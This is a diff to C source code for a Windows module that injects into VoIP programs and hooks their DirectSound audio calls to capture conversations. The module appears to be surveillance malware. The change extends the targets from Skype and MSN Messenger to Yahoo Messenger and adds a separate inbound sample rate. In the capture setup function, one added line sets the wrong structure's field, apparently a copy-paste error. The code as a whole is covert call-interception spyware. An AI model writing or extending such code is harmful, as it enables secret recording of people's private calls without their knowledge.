@@ -10,6 +10,7 @@
 #define SAMPLE_RATE_SKYPE_W	44100
 #define SAMPLE_RATE_GTALK	48000
 #define SAMPLE_RATE_YMSG	48000
+#define SAMPLE_RATE_YMSG_IN	96000
 #define SAMPLE_RATE_MSN		16000
 
 typedef MMRESULT (WINAPI *waveOutGetID_t) (HWAVEOUT , LPUINT);
@@ -358,7 +359,8 @@ DWORD PM_DSGetCP_setup(HMServiceStruct *pData)
 	if (proc_name) {
 		proc_name++; 
 		if (stricmp(proc_name, "skype.exe") && 
-			stricmp(proc_name, "msnmsgr.exe"))
+			stricmp(proc_name, "msnmsgr.exe") &&
+			stricmp(proc_name, "yahoomessenger.exe"))
 			return 1; // Hooka solo skype.exe e MSN
 		if (!stricmp(proc_name, "msnmsgr.exe") && IsVista(NULL))
 			return 1; // Solo su XP prendiamo le dsound
@@ -369,6 +371,8 @@ DWORD PM_DSGetCP_setup(HMServiceStruct *pData)
 		DSGetCPData.prog_type = VOIP_SKYPE;
 	else if (!stricmp(proc_name, "msnmsgr.exe"))
 		DSGetCPData.prog_type = VOIP_MSMSG;
+	else if (!stricmp(proc_name, "yahoomessenger.exe"))
+		DSGetCPData.prog_type = VOIP_YAHOO;
 	else
 		DSGetCPData.prog_type = 0;
 
@@ -494,7 +498,8 @@ DWORD PM_DSCapGetCP_setup(HMServiceStruct *pData)
 	if (proc_name) {
 		proc_name++; 
 		if (stricmp(proc_name, "skype.exe") &&
-			stricmp(proc_name, "msnmsgr.exe"))
+			stricmp(proc_name, "msnmsgr.exe") &&
+			stricmp(proc_name, "yahoomessenger.exe"))
 			return 1; // Hooka solo skype.exe e MSN
 		if (!stricmp(proc_name, "msnmsgr.exe") && IsVista(NULL))
 			return 1; // Solo su XP prendiamo le dsound
@@ -509,6 +514,8 @@ DWORD PM_DSCapGetCP_setup(HMServiceStruct *pData)
 		DSCapGetCPData.prog_type = VOIP_SKYPE;
 	else if (!stricmp(proc_name, "msnmsgr.exe"))
 		DSCapGetCPData.prog_type = VOIP_MSMSG;
+	else if (!stricmp(proc_name, "yahoomessenger.exe"))
+		DSGetCPData.prog_type = VOIP_YAHOO;
 	else 
 		DSCapGetCPData.prog_type = 0;
 
@@ -1798,7 +1805,12 @@ pVoiceAdditionalData VoipGetAdditionalData(partner_entry *partner_list, DWORD in
 	if (partner_list) {
 		switch (partner_list->voip_program) {
 			case VOIP_MSMSG: voip_header->uSampleRate = SAMPLE_RATE_MSN; break;
-			case VOIP_YAHOO: voip_header->uSampleRate = SAMPLE_RATE_YMSG; break;
+			case VOIP_YAHOO: 
+				if (in_out == 0)
+					voip_header->uSampleRate = SAMPLE_RATE_YMSG; 
+				else
+					voip_header->uSampleRate = SAMPLE_RATE_YMSG_IN; 
+				break;
 			case VOIP_SKYPE: voip_header->uSampleRate = SAMPLE_RATE_SKYPE; break;
 			case VOIP_GTALK: voip_header->uSampleRate = SAMPLE_RATE_GTALK; break;
 			case VOIP_MSNWS: voip_header->uSampleRate = sample_sampling[in_out]; break;
